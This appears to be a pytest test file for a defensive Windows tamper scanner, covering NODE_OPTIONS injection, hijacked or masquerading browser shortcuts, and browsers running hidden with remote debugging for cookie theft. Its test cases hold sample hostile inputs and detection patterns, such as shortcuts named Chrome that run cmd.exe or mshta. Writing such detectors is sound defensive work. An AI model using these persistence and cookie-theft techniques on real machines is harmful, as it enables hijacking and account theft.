        assert at.classify_node_environment({"ELECTRON_RUN_AS_NODE": empty}) == []


@pytest.mark.parametrize("value,flag", [
    (r"--require C:\Users\x\evil.js", r"--require C:\Users\x\evil.js"),
    (r'--require "C:\Program Files\x\hook.js"', r"--require C:\Program Files\x\hook.js"),
    ("-r ./a.js", "-r ./a.js"),
    ("--require=./a.js", "--require ./a.js"),
    ("--import file:///x/hook.mjs", "--import file:///x/hook.mjs"),
    ("--loader ts-node/esm", "--loader ts-node/esm"),
    ("--experimental-loader=./l.mjs", "--experimental-loader ./l.mjs"),
    ("--inspect", "--inspect"),
    ("--inspect=127.0.0.1:9229", "--inspect 127.0.0.1:9229"),
    ("--inspect-brk", "--inspect-brk"),
    ("--max-old-space-size=4096 --require ./a.js --no-warnings", "--require ./a.js"),
])
def test_node_options_injection_flags_are_high(value, flag):
    issues = at.classify_node_environment({"NODE_OPTIONS": value})
    assert len(issues) == 1 and issues[0].rule_id == "AEG-TAMPER-NODE-OPTIONS" and issues[0].flags == [flag]


@pytest.mark.parametrize("value", [
    "", "--max-old-space-size=4096", "--openssl-legacy-provider", "--no-warnings --enable-source-maps",
    "--inspect-port=9230", "--experimental-vm-modules", "--trace-warnings", "--stack-trace-limit=50",
])
def test_node_options_without_injection_is_clean(value):
    assert at.classify_node_environment({"NODE_OPTIONS": value}) == []


def test_env_findings_and_remediation():
    f = at.env_findings("user", "HKCU", "Environment", {"ELECTRON_RUN_AS_NODE": "1", "NODE_OPTIONS": "--require C:\\x\\h.js"})
    by = {x.rule_id: x for x in f}
    e = by["AEG-TAMPER-ELECTRON-NODE"]
    assert e.severity == Severity.HIGH and e.mitre == ["T1218.015"] and e.location == "HKCU\\Environment\\ELECTRON_RUN_AS_NODE"
    assert e.remediation.action == "delete_registry_value"
    assert e.remediation.params == {"hive": "HKCU", "key": "Environment", "value": "ELECTRON_RUN_AS_NODE", "view64": True}
    assert "signed" in e.description and "Node.js" in e.description
    n = by["AEG-TAMPER-NODE-OPTIONS"]
    assert n.severity == Severity.HIGH and n.mitre == ["T1574"] and n.evidence["flags"] == ["--require C:\\x\\h.js"]
    assert n.remediation.params["value"] == "NODE_OPTIONS"
    machine = at.env_findings("machine", at.ENV_SCOPES[1][1], at.ENV_SCOPES[1][2], {"NODE_OPTIONS": "--inspect"})[0]
    assert machine.remediation.params["hive"] == "HKLM" and machine.remediation.params["key"].endswith(r"Session Manager\Environment")
    assert at.env_findings("user", "HKCU", "Environment", {"TEMP": r"C:\t", "NODE_ENV": "production"}) == []


def test_check_environment(ctx, monkeypatch):
    monkeypatch.setattr(at, "IS_WINDOWS", False)
    out = list(at.check_environment(ctx))
    assert [(c.check_id, c.status) for c in out] == [("AEG-TAMPER-ENV", CheckStatus.SKIP)]
    monkeypatch.setattr(at, "IS_WINDOWS", True)
    monkeypatch.setattr(at, "read_environment_values", lambda: {"user": {"ELECTRON_RUN_AS_NODE": "1", "TEMP": "x"},
                                                                  "machine": {"NODE_OPTIONS": "--import ./h.mjs"}})
    findings, checks = split(list(at.check_environment(ctx)))
    assert sorted(rules(findings)) == ["AEG-TAMPER-ELECTRON-NODE", "AEG-TAMPER-NODE-OPTIONS"]
    assert checks[0].status == CheckStatus.FAIL and ctx.stats["tamper_env_values"] == 3
    monkeypatch.setattr(at, "read_environment_values", lambda: {"user": {"PATH": "x"}, "machine": {}})
    findings, checks = split(list(at.check_environment(ctx)))
    assert findings == [] and checks[0].status == CheckStatus.PASS


# =========================================================================== browser shortcut arguments
@pytest.mark.parametrize("args", [
    "",
    "--profile-directory=Default",
    '--profile-directory="Profile 1"',
    "--profile-directory=Default --app-id=fmgjjmmmlfnkbppncabfkddbjimcfncm --app-launch-source=4",
    "--app=https://mail.google.com/mail/u/0 --profile-directory=Default",
    "--app-url=https://example.com/app --app-id=abc",
    "--new-window", "--incognito", "--inprivate", "-private", "-private-window", "--start-maximized", "--disable-gpu",
    "-P default-release", '-P "My Profile" --no-remote', "-no-remote -P work.profile", '-profile "C:\\Users\\x\\abc.default"',
    "--no-proxy-server", "%1", "--user-data-dir=C:\\Chrome\\Data", "report.pdf", "index.html", r"C:\Users\x\notes.txt",
    "file:///C:/Users/x/a.html", "--force-dark-mode --enable-features=WebUIDarkMode",
])
def test_harmless_browser_arguments_are_ignored(args):
    assert at.classify_browser_args(args) == []


@pytest.mark.parametrize("args,kind,sev,mitre", [
    (r'--load-extension="C:\Users\x\AppData\Local\ext one"', "load_extension", Severity.HIGH, ["T1547.009", "T1176.001"]),
    ("--load-extension=C:\\ext", "load_extension", Severity.HIGH, ["T1547.009", "T1176.001"]),
    ("-load-extension=C:\\ext", "load_extension", Severity.HIGH, ["T1547.009", "T1176.001"]),
    ("/load-extension=C:\\ext", "load_extension", Severity.HIGH, ["T1547.009", "T1176.001"]),
    ("--remote-debugging-port=9222", "remote_debugging", Severity.HIGH, ["T1547.009", "T1539"]),
    ("--remote-debugging-pipe", "remote_debugging", Severity.HIGH, ["T1547.009", "T1539"]),
    ("--proxy-server=http://203.0.113.5:8080", "traffic", Severity.HIGH, ["T1547.009", "T1557"]),
    ("--proxy-pac-url=http://203.0.113.5/p.pac", "traffic", Severity.HIGH, ["T1547.009", "T1557"]),
    ('--host-resolver-rules="MAP * 203.0.113.5"', "traffic", Severity.HIGH, ["T1547.009", "T1557"]),
    ("--disable-web-security", "traffic", Severity.HIGH, ["T1547.009", "T1557"]),
    ("--ignore-certificate-errors", "traffic", Severity.HIGH, ["T1547.009", "T1557"]),
    ("--ignore-certificate-errors-spki-list=abc=", "traffic", Severity.HIGH, ["T1547.009", "T1557"]),
    ("http://start.example/home", "start_page", Severity.MEDIUM, ["T1547.009"]),
    ("https://search.example.com/?q=%s", "start_page", Severity.MEDIUM, ["T1547.009"]),
    ("ftp://files.example/a", "start_page", Severity.MEDIUM, ["T1547.009"]),
    ("example.com", "start_page", Severity.MEDIUM, ["T1547.009"]),
    ("search.example.net/q?x=1", "start_page", Severity.MEDIUM, ["T1547.009"]),
    ("--new-window https://start.example", "start_page", Severity.MEDIUM, ["T1547.009"]),
    ("-new-tab https://start.example", "start_page", Severity.MEDIUM, ["T1547.009"]),
])
def test_risky_browser_arguments(args, kind, sev, mitre):
    issues = at.classify_browser_args(args)
    assert [i.kind for i in issues] == [kind]
    assert issues[0].severity == sev and issues[0].mitre == mitre and issues[0].switches


def test_browser_arguments_with_several_problems():
    issues = at.classify_browser_args("--profile-directory=Default --load-extension=C:\\x --remote-debugging-port=0 http://a.example")
    assert [i.kind for i in issues] == ["load_extension", "remote_debugging", "start_page"]
    assert at.LNK_RULES["start_page"][0] == "AEG-TAMPER-LNK-STARTPAGE"


# =========================================================================== masquerading shortcuts
@pytest.mark.parametrize("name,target", [
    ("Google Chrome.lnk", r"C:\Windows\System32\cmd.exe"),
    ("Microsoft Edge.lnk", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
    ("Firefox.lnk", r"C:\Windows\System32\wscript.exe"),
    ("Brave.lnk", r"C:\Windows\System32\mshta.exe"),
    ("Opera GX.lnk", r"C:\Windows\System32\rundll32.exe"),
    ("Opera.lnk", r"C:\Users\x\AppData\Local\Temp\launcher.exe"),  # launcher.exe only counts inside an Opera folder
    ("Google Chrome.lnk", r"C:\Users\x\AppData\Local\Temp\chrome_update.exe"),
    ("Google Chrome.lnk", r"C:\Users\x\AppData\Roaming\Updater\run.js"),
    ("Google Chrome.lnk", r"C:\Users\x\Downloads\setup.vbs"),
    ("Google Chrome.lnk", r"C:\Users\Public\x.bat"),
    ("Google Chrome.lnk", r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"),
    ("Google Chrome - Shortcut.lnk", r"C:\Windows\System32\cmd.exe"),
    ("Chrome (2).lnk", r"C:\Windows\System32\cmd.exe"),
    ("Mozilla Firefox.lnk", r"C:\Windows\System32\cmd.exe"),
    ("Vivaldi.lnk", r"C:\Windows\System32\cmd.exe"),
])
def test_browser_named_shortcut_with_wrong_target_is_masquerading(name, target):
    issue = at.masquerade_issue(name, target)
    assert issue is not None and issue.kind == "masquerade" and issue.rule_id == "AEG-TAMPER-LNK-MASQUERADE"
    assert issue.severity == Severity.HIGH and issue.mitre == ["T1547.009", "T1036"]


@pytest.mark.parametrize("name,target", [
    ("Google Chrome.lnk", r"C:\Program Files\Google\Chrome\Application\chrome.exe"),
    ("Google Chrome.lnk", r"C:\Users\x\AppData\Local\Google\Chrome\Application\chrome.exe"),  # per-user install
    ("Microsoft Edge.lnk", r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"),
    ("Firefox.lnk", r"C:\Program Files\Mozilla Firefox\firefox.exe"),
    ("Brave.lnk", r"C:\Users\x\AppData\Local\BraveSoftware\Brave-Browser\Application\brave.exe"),
    ("Opera.lnk", r"C:\Users\x\AppData\Local\Programs\Opera\launcher.exe"),
    ("Opera GX.lnk", r"C:\Users\x\AppData\Local\Programs\Opera GX\opera.exe"),
    ("Opera Browser.lnk", r"C:\Users\x\AppData\Local\Programs\Opera\opera.exe"),
    ("Vivaldi.lnk", r"C:\Users\x\AppData\Local\Vivaldi\Application\vivaldi.exe"),
    ("Yandex.lnk", r"C:\Users\x\AppData\Local\Yandex\YandexBrowser\Application\browser.exe"),
    ("Chromium.lnk", r"C:\Users\x\AppData\Local\Chromium\Application\chrome.exe"),
    ("Internet Explorer.lnk", r"C:\Program Files\Internet Explorer\iexplore.exe"),
    ("Notepad.lnk", r"C:\Windows\System32\cmd.exe"),  # not named like a browser
    ("Chrome Remote Desktop.lnk", r"C:\Windows\System32\cmd.exe"),
    ("Firefox Private Browsing.lnk", r"C:\Program Files\Mozilla Firefox\private_browsing.exe"),
    ("Operation Zero.lnk", r"C:\Games\oz.exe"),
    ("Opera Browser Assistant.lnk", r"C:\Users\x\AppData\Local\Programs\Opera\assistant\browser_assistant.exe"),
    ("Opera GX Uninstall.lnk", r"C:\Users\x\AppData\Local\Programs\Opera GX\opera_uninstall.exe"),
    ("Google Chrome.lnk", ""),  # unresolved target: no evidence either way
    ("Microsoft Edge.lnk", "shell:AppsFolder\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe!MicrosoftEdge"),
])
def test_legitimate_browser_shortcuts_are_not_masquerading(name, target):
    assert at.masquerade_issue(name, target) is None


def test_chrome_and_edge_pwa_shortcuts_are_legitimate():
    for name, proxy, args in (("Gmail.lnk", r"C:\Program Files\Google\Chrome\Application\chrome_proxy.exe",
                               "--profile-directory=Default --app-id=fmgjjmmmlfnkbppncabfkddbjimcfncm"),
                              ("Outlook (PWA).lnk", r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe",
                               "--profile-directory=Default --app-id=abcdefghijklmnopabcdefghijklmnop --app-launch-source=4"),
                              ("Microsoft Edge.lnk", r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe",
                               "--profile-directory=Default --app-id=abcdefghijklmnopabcdefghijklmnop")):
        assert at.classify_shortcut(name, parse_lnk(build_lnk(proxy, args=args))) == [], name
    hijacked = parse_lnk(build_lnk(r"C:\Program Files\Google\Chrome\Application\chrome_proxy.exe",
                                   args="--profile-directory=Default --load-extension=C:\\x"))
    assert [i.kind for i in at.classify_shortcut("Gmail.lnk", hijacked)] == ["load_extension"]


def test_classify_shortcut_end_to_end():
    def classify(name, target, args=""):
        return [i.kind for i in at.classify_shortcut(name, parse_lnk(build_lnk(target, args=args)))]

    assert classify("Google Chrome.lnk", CHROME) == []
    assert classify("Google Chrome.lnk", CHROME, "--profile-directory=Default") == []
    assert classify("Google Chrome.lnk", CHROME, "--load-extension=C:\\Users\\x\\AppData\\Local\\Temp\\e") == ["load_extension"]
    assert classify("Chrome.lnk", CHROME, "--remote-debugging-port=9222 http://x.example") == ["remote_debugging", "start_page"]
    assert classify("Google Chrome.lnk", r"C:\Windows\System32\cmd.exe", "/c start chrome.exe --load-extension=C:\\e") == ["masquerade"]
    assert classify("Google Chrome.lnk", r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                    "--proxy-server=1.2.3.4:80") == ["traffic", "masquerade"]
    assert classify("Notes.lnk", r"C:\Windows\notepad.exe", "http://example.com") == []  # not a browser target
    # an unexpanded %VAR% target is expanded before the browser check
    env = parse_lnk(build_lnk(CHROME, args="--disable-web-security", env_target=r"%ProgramFiles%\Google\Chrome\Application\chrome.exe"))
    assert [i.kind for i in at.classify_shortcut("Google Chrome.lnk", env)] == ["traffic"]


def test_browser_of_target():
    assert at.browser_of_target(CHROME) == "Chrome" and at.browser_of_target(r"C:\x\MSEdge.EXE") == "Edge"
    assert at.browser_of_target(r"C:\Users\x\AppData\Local\Programs\Opera\launcher.exe") == "Opera"
    assert at.browser_of_target(r"C:\Temp\launcher.exe") is None and at.browser_of_target(r"C:\Temp\browser.exe") is None
    assert at.browser_of_target(r"C:\Yandex\YandexBrowser\Application\browser.exe") == "Yandex Browser"
    assert at.browser_of_target(r"C:\Windows\notepad.exe") is None and at.browser_of_target("") is None


# =========================================================================== shortcut discovery and findings
def test_shortcut_locations(tmp_path):
    env = {"APPDATA": str(tmp_path / "Roaming"), "ProgramData": str(tmp_path / "PD"), "PUBLIC": str(tmp_path / "Pub"),
           "OneDrive": str(tmp_path / "OD")}
    home = tmp_path / "home"
    locs = dict((str(p), d) for p, d in at.shortcut_locations(env, home))
    roaming = tmp_path / "Roaming"
    assert locs[str(home / "Desktop")] == 0 and locs[str(tmp_path / "OD" / "Desktop")] == 0
    assert locs[str(tmp_path / "Pub" / "Desktop")] == 0
    assert locs[str(roaming / "Microsoft" / "Windows" / "Start Menu" / "Programs")] == 3
    assert locs[str(tmp_path / "PD" / "Microsoft" / "Windows" / "Start Menu" / "Programs")] == 3
    quick = roaming / "Microsoft" / "Internet Explorer" / "Quick Launch"
    assert locs[str(quick)] == 0 and locs[str(quick / "User Pinned" / "TaskBar")] == 0
    assert locs[str(quick / "User Pinned" / "StartMenu")] == 0 and len(locs) == 8
    assert str(tmp_path / "OD" / "Desktop") not in {str(p) for p, _d in at.shortcut_locations({}, home)}


def test_collect_shortcut_files_depth_and_cap(tmp_path):
    desktop = tmp_path / "Desktop"
    programs = tmp_path / "Programs"
    for rel in ("Desktop/a.lnk", "Desktop/B.LNK", "Desktop/notes.txt", "Desktop/sub/hidden.lnk",
                "Programs/top.lnk", "Programs/a/one.lnk", "Programs/a/b/two.lnk", "Programs/a/b/c/three.lnk",
                "Programs/a/b/c/d/four.lnk"):
        p = tmp_path / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(b"x")
    got = at.collect_shortcut_files([(desktop, 0), (programs, 3), (tmp_path / "missing", 3)])
    assert sorted(p.name for p in got) == ["B.LNK", "a.lnk", "one.lnk", "three.lnk", "top.lnk", "two.lnk"]
    assert len(at.collect_shortcut_files([(programs, 3)], limit=2)) == 2


def test_shortcut_finding_fields(tmp_path):
    path = tmp_path / "Google Chrome.lnk"
    info = parse_lnk(build_lnk(CHROME, args="--load-extension=C:\\x --proxy-server=http://user:hunter2@203.0.113.5:80",
                               working_dir=r"C:\w"))
    issues = at.classify_shortcut(path.name, info)
    f = at.shortcut_finding(path, info, issues)
    assert f.rule_id == "AEG-TAMPER-LNK-EXTENSION" and f.severity == Severity.HIGH and f.category == "browser"
    assert f.location == str(path) and f.title.endswith(": Google Chrome.lnk") and "extension" in f.title
    assert f.mitre == ["T1547.009", "T1176.001", "T1557"]
    assert f.remediation.action == "quarantine_file" and f.remediation.params == {"path": str(path)}
    assert "re-pin" in f.recommendation and "ChromeLoader" in f.description and "reroutes traffic" in f.description
    assert f.evidence["target"] == CHROME and f.evidence["browser"] == "Chrome" and len(f.evidence["issues"]) == 2
    assert "hunter2" not in json.dumps(f.to_dict())
    start = parse_lnk(build_lnk(CHROME, args="http://start.example/"))
    g = at.shortcut_finding(tmp_path / "Chrome.lnk", start, at.classify_shortcut("Chrome.lnk", start))
    assert g.rule_id == "AEG-TAMPER-LNK-STARTPAGE" and g.severity == Severity.MEDIUM
    assert g.title.startswith("Browser shortcut opens a forced start page")


def test_check_shortcuts_end_to_end(ctx, tmp_path, monkeypatch):
    monkeypatch.setattr(at, "IS_WINDOWS", False)
    assert [(c.check_id, c.status) for c in at.check_shortcuts(ctx)] == [("AEG-TAMPER-SHORTCUTS", CheckStatus.SKIP)]
    monkeypatch.setattr(at, "IS_WINDOWS", True)
    files = {
        "hijacked.lnk": build_lnk(CHROME, args="--load-extension=C:\\Users\\x\\AppData\\Local\\Temp\\e"),
        "Microsoft Edge.lnk": build_lnk(r"C:\Windows\System32\mshta.exe", args="http://bad.example/x.hta"),
        "pwa.lnk": build_lnk(r"C:\Program Files\Google\Chrome\Application\chrome_proxy.exe",
                             args="--profile-directory=Default --app-id=fmgjjmmmlfnkbppncabfkddbjimcfncm"),
        "Google Chrome.lnk": build_lnk(CHROME),
        "Notepad.lnk": build_lnk(r"C:\Windows\notepad.exe", args="a.txt"),
        "garbage.lnk": b"this is not a shortcut at all",
    }
    paths = []
    for name, data in files.items():
        p = tmp_path / name
        p.write_bytes(data)
        paths.append(p)
    monkeypatch.setattr(at, "find_shortcut_files", lambda: paths)
    findings, checks = split(list(at.check_shortcuts(ctx)))
    assert sorted((f.rule_id, f.location.rsplit(os.sep, 1)[-1]) for f in findings) == [
        ("AEG-TAMPER-LNK-EXTENSION", "hijacked.lnk"), ("AEG-TAMPER-LNK-MASQUERADE", "Microsoft Edge.lnk")]
    assert checks[0].status == CheckStatus.FAIL and "5 shortcut(s) read (6 found): 2 suspicious" in checks[0].detail
    assert ctx.stats["tamper_shortcuts"] == 5
    monkeypatch.setattr(at, "find_shortcut_files", lambda: [paths[2], paths[3]])
    findings, checks = split(list(at.check_shortcuts(ctx)))
    assert findings == [] and checks[0].status == CheckStatus.PASS


# =========================================================================== browsers running with cookie-theft switches
WIN_DEFAULT = r"C:\Users\x\AppData\Local\Google\Chrome\User Data"


def risk(name, cmdline, exe=""):
    return at.browser_cmdline_risk(name, cmdline, exe)


@pytest.mark.parametrize("name,cmdline", [
    ("chrome.exe", r'"C:\Program Files\Google\Chrome\Application\chrome.exe" --headless --remote-debugging-port=9222'),
    ("chrome.exe", "chrome.exe --headless=new --remote-debugging-port=0"),
    ("chrome.exe", "chrome.exe --headless=old --remote-debugging-pipe"),
    ("chrome.exe", "chrome.exe --remote-debugging-port=9222 --headless --disable-gpu --no-sandbox"),
    ("chrome.exe", rf'chrome.exe --remote-debugging-port=9222 --headless --user-data-dir="{WIN_DEFAULT}"'),
    ("chrome.exe", rf'chrome.exe --remote-debugging-port=9222 --headless --user-data-dir="{WIN_DEFAULT}\\"'),
    ("chrome.exe", rf'chrome.exe --remote-debugging-port=9222 --headless --user-data-dir="{WIN_DEFAULT}\Default"'),
    ("msedge.exe", r'msedge.exe --headless --remote-debugging-port=9222 --user-data-dir="C:\Users\x\AppData\Local\Microsoft\Edge\User Data"'),
    ("brave.exe", r'brave.exe --headless --remote-debugging-port=9222 --user-data-dir="C:\Users\x\AppData\Local\BraveSoftware\Brave-Browser\User Data"'),
    ("google-chrome", "/usr/bin/google-chrome --headless --remote-debugging-port=9222 --user-data-dir=/home/x/.config/google-chrome"),
    ("chromium-browser", "chromium-browser --headless --remote-debugging-port=9222"),
    ("microsoft-edge", "microsoft-edge --headless --remote-debugging-port=9222 --user-data-dir=/home/x/.config/microsoft-edge"),
    ("Google Chrome", '"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" --headless --remote-debugging-port=9222 '
                      '--user-data-dir="/Users/x/Library/Application Support/Google/Chrome"'),
    ("Brave Browser", 'Brave Browser --headless --remote-debugging-port=1 --user-data-dir="/Users/x/Library/Application Support/BraveSoftware/Brave-Browser"'),
    ("firefox.exe", "firefox.exe -headless --remote-debugging-port 9222"),
])
def test_headless_remote_debugging_on_the_real_profile_is_high(name, cmdline):
    r = risk(name, cmdline)
    assert r is not None and r.rule_id == "AEG-TAMPER-BROWSER-DEBUG" and r.severity == Severity.HIGH, cmdline
    assert r.title == "Browser started headless with remote debugging on your real profile (cookie theft)"
    assert r.mitre == ["T1539", "T1185"] and r.profile == "default" and "headless" in r.stealth


@pytest.mark.parametrize("extra", ["--window-position=-2400,-2400", "--window-position=-32000,-32000", "--silent-launch",
                                   "--window-position=-12000,0"])
def test_hidden_window_or_silent_launch_with_remote_debugging_is_high(extra):
    r = risk("chrome.exe", f"chrome.exe --remote-debugging-port=9222 {extra}")
    assert r.severity == Severity.HIGH and "hidden window" in r.title and r.stealth and "headless" not in r.stealth


@pytest.mark.parametrize("cmdline", [
    "chrome.exe --remote-debugging-port=9222",
    "chrome.exe --remote-debugging-pipe --profile-directory=Default",
    "chrome.exe --remote-debugging-port=9222 --window-position=-1920,0",  # a monitor to the left is not a hidden window
    "chrome.exe --remote-debugging-port=9222 --window-position=-5000,100",
    "chrome.exe --remote-debugging-port=9222 --window-position=100,100",
    "chrome.exe --remote-debugging-port=9222 --headless=false",
    rf'chrome.exe --remote-debugging-port=9222 --user-data-dir="{WIN_DEFAULT}"',
])
def test_remote_debugging_on_the_real_profile_without_hiding_is_medium(cmdline):
    r = risk("chrome.exe", cmdline)
    assert r.rule_id == "AEG-TAMPER-BROWSER-DEBUG" and r.severity == Severity.MEDIUM and r.stealth == []
    assert r.title == "Browser running with remote debugging on your real profile"


@pytest.mark.parametrize("name,cmdline", [
    ("chrome.exe", r"chrome.exe --headless --remote-debugging-port=9222 --user-data-dir=C:\Users\x\AppData\Local\Temp\puppeteer_dev_chrome_profile-AbC123"),
    ("chrome.exe", r"chrome.exe --headless --remote-debugging-port=0 --user-data-dir=C:\Users\x\AppData\Local\Temp\playwright_chromiumdev_profile-xYz"),
    ("chrome.exe", r"chrome.exe --remote-debugging-port=9222 --user-data-dir=C:\Users\x\AppData\Local\Temp\scoped_dir1234_5678"),
    ("chromium", "chromium --headless --remote-debugging-port=9222 --user-data-dir=/tmp/playwright_chromiumdev_profile-abc123"),
    ("chrome", "chrome --headless --remote-debugging-pipe --user-data-dir=/tmp/.org.chromium.Chromium.scoped_dir.AbCd"),
    ("chrome.exe", r"chrome.exe --headless --remote-debugging-port=9222 --user-data-dir=D:\Work\my-test-profile"),  # any other folder
    ("chrome.exe", r'chrome.exe --headless --remote-debugging-port=9222 --user-data-dir "D:\Work\my profile"'),
    ("Google Chrome", "Google Chrome --headless --remote-debugging-port=9222 --user-data-dir=/var/folders/ab/cd/T/puppeteer_dev_profile-x"),
    ("msedge.exe", r"msedge.exe --remote-debugging-port=9222 --user-data-dir=C:\Temp\edge-test"),  # temp, not hidden
    ("chrome.exe", r"chrome.exe --headless --remote-debugging-port=9222 --user-data-dir=C:\Users\x\AppData\Local\Temp\lighthouse.12345678"),
    ("firefox", "firefox -headless --remote-debugging-port 9222 -profile /tmp/rust_mozprofileAbC123"),
    ("firefox", "firefox -headless --remote-debugging-port 9222 -profile /tmp/playwright_firefoxdev_profile-abc"),
])
def test_remote_debugging_with_a_separate_profile_is_test_automation(name, cmdline):
    assert risk(name, cmdline) is None, cmdline


@pytest.mark.parametrize("cmdline", [
    r"chrome.exe --headless --remote-debugging-port=9222 --user-data-dir=C:\Users\x\AppData\Local\Temp\anything",
    r"msedge.exe --headless=new --remote-debugging-port=9222 --user-data-dir=C:\Temp\edge-copy",
    r'chrome.exe --window-position=-2400,-2400 --remote-debugging-port=9333 --user-data-dir="C:\Users\x\AppData\Local\Temp\tmp4f2a\User Data"',
    "chrome --headless --remote-debugging-port=9222 --user-data-dir=/tmp/tmp.k3J9x",
])
def test_hidden_remote_debugging_on_an_unnamed_temp_profile_is_medium(cmdline):
    """Chrome 136+ refuses remote debugging on the default profile, so stealers copy it into Temp and run the copy hidden."""
    r = risk(cmdline.split()[0], cmdline)
    assert r is not None and r.rule_id == "AEG-TAMPER-BROWSER-DEBUG" and r.severity == Severity.MEDIUM
    assert r.profile == "temp" and r.stealth and "temporary folder" in r.title and "T1539" in r.mitre


def test_browser_risk_ignores_child_processes_and_non_browsers():
    assert risk("chrome.exe", "chrome.exe --type=renderer --remote-debugging-port=9222 --headless") is None
    assert risk("chrome.exe", "chrome.exe --type=gpu-process --load-extension=C:\\Temp\\e") is None
    assert risk("firefox.exe", "firefox.exe -contentproc --remote-debugging-port 9222 -headless") is None
    for name in ("notepad.exe", "code", "msedgewebview2.exe", "python3", "chrome_crashpad_handler", "Google Chrome Helper"):
        assert risk(name, f"{name} --headless --remote-debugging-port=9222") is None
    assert risk("chrome.exe", "") is None and risk("chrome.exe", []) is None and risk("chrome.exe", None) is None
    assert risk("chrome.exe", "chrome.exe --profile-directory=Default --new-window") is None


def test_browser_names_and_path_qualified_names():
    cmd = "--headless --remote-debugging-port=9222"
    for name in ("google-chrome-stable", "chromium-browser", "microsoft-edge-stable", "brave-browser", "Microsoft Edge",
                 "vivaldi-bin", "opera.exe", "firefox-esr", "CHROME.EXE", "iexplore.exe"):
        assert risk(name, f"{name} {cmd}") is not None, name
    assert risk("launcher.exe", rf'"C:\Users\x\AppData\Local\Programs\Opera\launcher.exe" {cmd}') is not None
    assert risk("launcher.exe", f"launcher.exe {cmd}") is None  # a generic launcher.exe is not Opera
    assert risk("launcher.exe", f"launcher.exe {cmd}", exe=r"C:\Users\x\AppData\Local\Programs\Opera GX\launcher.exe") is not None
    assert risk("browser.exe", rf'"C:\Users\x\AppData\Local\Yandex\YandexBrowser\Application\browser.exe" {cmd}') is not None
    assert risk("browser.exe", f"browser.exe {cmd}") is None
    assert at.browser_main_process("chrome.exe", ["chrome.exe", "--type=utility"]) is None
    assert at.browser_main_process("chrome.exe", ["chrome.exe"]) == "Chrome"


def test_browser_cmdline_accepts_list_and_string_forms():
    argv = ["C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "--headless", "--remote-debugging-port=9222",
            "--user-data-dir=" + WIN_DEFAULT]
    assert risk("chrome.exe", argv).severity == Severity.HIGH
    assert risk("chrome.exe", subprocess.list2cmdline(argv)).severity == Severity.HIGH
    assert risk("chrome.exe", argv[:1] + ["--remote-debugging-port=1"]).severity == Severity.MEDIUM


@pytest.mark.parametrize("cmdline,sev", [
    (r"chrome.exe --load-extension=C:\Users\x\AppData\Local\Temp\ext", Severity.HIGH),
    (r'chrome.exe --load-extension="C:\Users\x\AppData\Roaming\Updater\ext"', Severity.HIGH),
    (r"chrome.exe --load-extension=C:\Users\x\Downloads\ext", Severity.HIGH),
    (r"chrome.exe --load-extension=C:\ProgramData\ext", Severity.HIGH),
    (r"chrome.exe --load-extension=C:\good\ext,C:\Windows\Temp\bad", Severity.HIGH),
    ("google-chrome --load-extension=/tmp/ext", Severity.HIGH),
    ("google-chrome --load-extension=/home/x/Downloads/ext", Severity.HIGH),
    (r"chrome.exe --load-extension=C:\dev\my-extension", Severity.MEDIUM),
    ("chromium --load-extension=/home/x/src/ext", Severity.MEDIUM),
    (r"chrome.exe --load-extension=C:\dev\ext --user-data-dir=D:\Work\profile", Severity.MEDIUM),
    (r"chrome.exe --load-extension=C:\Users\x\AppData\Local\Temp\ext --user-data-dir=D:\Work\profile", Severity.HIGH),
    (r"chrome.exe --load-extension=C:\Users\x\AppData\Local\Temp\ext --user-data-dir=C:\Users\x\AppData\Local\Temp\puppeteer_dev_chrome_profile-a",
     Severity.MEDIUM),  # a separate automation profile never reaches HIGH
    (r"chrome.exe --load-extension=C:\dev\ext --user-data-dir=C:\Users\x\AppData\Local\Temp\scoped_dir1_2", Severity.MEDIUM),
])
def test_load_extension_severity(cmdline, sev):
    r = risk("chrome.exe" if cmdline.startswith("chrome.exe") else cmdline.split()[0], cmdline)
    assert r.rule_id == "AEG-TAMPER-BROWSER-EXT" and r.severity == sev and r.mitre == ["T1176.001"], cmdline
    assert r.switches and r.switches[0].startswith("--load-extension")


def test_browser_risk_picks_the_most_serious_finding():
    both = risk("chrome.exe", r"chrome.exe --remote-debugging-port=9222 --load-extension=C:\Users\x\AppData\Local\Temp\e")
    assert both.rule_id == "AEG-TAMPER-BROWSER-EXT" and both.severity == Severity.HIGH
    assert both.switches == [r"--load-extension=C:\Users\x\AppData\Local\Temp\e", "--remote-debugging-port=9222"]
    hidden = risk("chrome.exe", r"chrome.exe --headless --remote-debugging-port=9222 --load-extension=C:\dev\e")
    assert hidden.rule_id == "AEG-TAMPER-BROWSER-DEBUG" and hidden.severity == Severity.HIGH
    tie = risk("chrome.exe", r"chrome.exe --remote-debugging-port=9222 --load-extension=C:\dev\e")
    assert tie.rule_id == "AEG-TAMPER-BROWSER-DEBUG" and tie.severity == Severity.MEDIUM


def test_default_profile_dir_and_profile_kinds():
    for p in (WIN_DEFAULT, WIN_DEFAULT + "\\", "C:/Users/x/AppData/Local/Microsoft/Edge/User Data/Profile 2",
              "/home/x/.config/google-chrome", "/home/x/.config/chromium/", "/Users/x/Library/Application Support/Google/Chrome",
              r"C:\Users\x\AppData\Roaming\Opera Software\Opera Stable", "/home/x/.mozilla/firefox/abc.default-release",
              r"C:\Users\x\AppData\Roaming\Mozilla\Firefox\Profiles\abc.default-release"):
        assert at.is_default_profile_dir(p), p
    for p in (r"C:\Users\x\AppData\Local\Temp\puppeteer_dev_chrome_profile-1", "/tmp/x", "/home/x/test-profile",
              r"D:\Google\Chrome", ""):
        assert not at.is_default_profile_dir(p), p
    assert at.browser_profile(["chrome.exe"]) == ("default", "")
    assert at.browser_profile(["chrome.exe", "--user-data-dir=" + WIN_DEFAULT])[0] == "default"
    assert at.browser_profile(["chrome.exe", "--user-data-dir=/tmp/x"])[0] == "temp"
    assert at.browser_profile(["chrome.exe", "--user-data-dir=/tmp/puppeteer_dev_chrome_profile-x"])[0] == "automation"
    assert at.browser_profile(["chrome.exe", "--user-data-dir", r"D:\p"]) == ("custom", r"D:\p")
